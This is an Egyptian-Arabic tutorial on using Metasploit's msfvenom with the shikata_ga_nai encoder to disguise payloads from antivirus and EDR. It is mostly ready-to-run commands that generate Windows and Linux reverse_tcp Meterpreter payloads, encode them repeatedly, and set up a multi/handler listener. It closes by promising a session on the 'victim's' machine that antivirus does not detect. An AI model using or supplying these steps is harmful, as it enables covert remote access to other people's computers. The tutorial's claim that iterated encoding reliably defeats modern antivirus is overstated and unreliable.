
# **📌 يعني إيه Encoding؟**

✅ التشفير (Encoding) هو عملية **تعديل البيانات بحيث تفضل شغالة لكن تبقى غير قابلة للاكتشاف بسهولة**.  
✅ لما تعمل **Payload باستخدام MSFVenom**، برامج الحماية (Antivirus و EDR) ممكن تكتشفه، فبنستخدم **Encoders** عشان نخفيه.  
✅ التشفير **مش نفس التشفير الأمني (Encryption)**، هو بس بيغير شكل البيانات بدون حماية فعلية، لكن الهدف هنا هو **تجنب اكتشافه**.

---

# **🔥 ليه بنستخدم Encoding؟**

❌ برامج الحماية عندها قواعد (Signatures) بتتعرف بيها على الـ Payloads المشهورة.  
❌ لو حاولت تستخدم **Payload عادي من غير تشفير**، هيتكشف بسهولة.  
✅ الحل هو **استخدام Encoder** عشان نغير البصمة الرقمية بتاعت الـ Payload.

---

# **🛠️ أشهر Encoders في Metasploit**

💻 لو عايز تشوف كل الـ Encoders المتاحة في Metasploit:

```bash
msfvenom -l encoders
```

⬅️ هيظهرلك **قائمة بالـ Encoders** اللي ممكن تستخدمها.

### **🔹 1. أشهر Encoder: Shikata Ga Nai**

✅ هو أشهر Encoder، بيستخدم طريقة **XOR-based encryption** عشان يغير شكل الـ Payload.  
✅ لما تستخدمه، **كل مرة بيطلع لك شكل مختلف للـ Payload**، وده بيقلل احتمالية اكتشافه.  
✅ ينفع مع **أنظمة الويندوز واللينكس**.

---

# **💡 إزاي نستخدم Encoding مع MSFVenom؟**

## **🟢 1. توليد Payload عادي (بدون تشفير)**

لو عايز تولد **Reverse Shell عادي للويندوز بدون تشفير**:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
```

⬅️ لو شغلته على جهاز فيه **Antivirus قوي**، هيتم اكتشافه فورًا! 🚨

---

## **🟢 2. توليد Payload مشفر باستخدام Shikata Ga Nai**

لو عايز **تخفي الـ Payload عن برامج الحماية**، استخدم الـ Encoder كالتالي:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe
```

✅ **-e x86/shikata_ga_nai** →  shikata_ga_nai.   اسمه Encoder استخدم
✅ **-i 10** → عيد التشفير 10 مرات عشان تزود التمويه.  
✅ **-f exe** → حفظه كملف تنفيذي للويندوز.

🎯 **كل مرة تشغل الأمر ده، هيطلع لك Payload مختلف، صعب على برامج الحماية اكتشافه!** 🔥

---

## **🟢 3. توليد Payload مشفر لنظام لينكس**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf > encoded.elf
```

✅ نفس الطريقة لكن هنا الـ Payload متوافق مع **لينكس** وحفظناه بصيغة **ELF**.

---

# **🔐 التحقق من تشفير الـ Payload**

بعد ما تولد الـ Payload المشفر، تقدر **تتأكد إنه مختلف عن الأصلي** باستخدام أداة `msfvenom` نفسها:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f raw | msfvenom -e x86/shikata_ga_nai -i 5 -f raw | hexdump -C | less
```

✅ ده بيعرض **التغييرات اللي حصلت في الـ Payload بعد التشفير**.

---

# **💡 الخلاصة بالمصري:**
2️⃣ **أشهر Encoder هو `shikata_ga_nai`، بيستخدم XOR عشان يغير شكل الـ Payload كل مرة.**  
3️⃣ **كل ما زودت عدد التكرارات (`-i`)، كل ما بقى أصعب على برامج الحماية تكتشفه.**  
4️⃣ **لو شغلت الـ Payload المشفر، هيشتغل بنفس الوظيفة لكنه هيكون أصعب في الاكتشاف.**

---

# **🛠️ خطوات عملية لتشفير الـ Payload واستخدامه في Metasploit**

✅ **1. توليد Payload مشفر:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > bypass.exe
```

✅ **2. إعداد Metasploit لاستقبال الاتصال:**

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

🎯 **بمجرد تشغيل الـ Payload المشفر على جهاز الضحية، هتوصلك جلسة Meterpreter من غير ما الـ Antivirus يكتشفها!** 🔥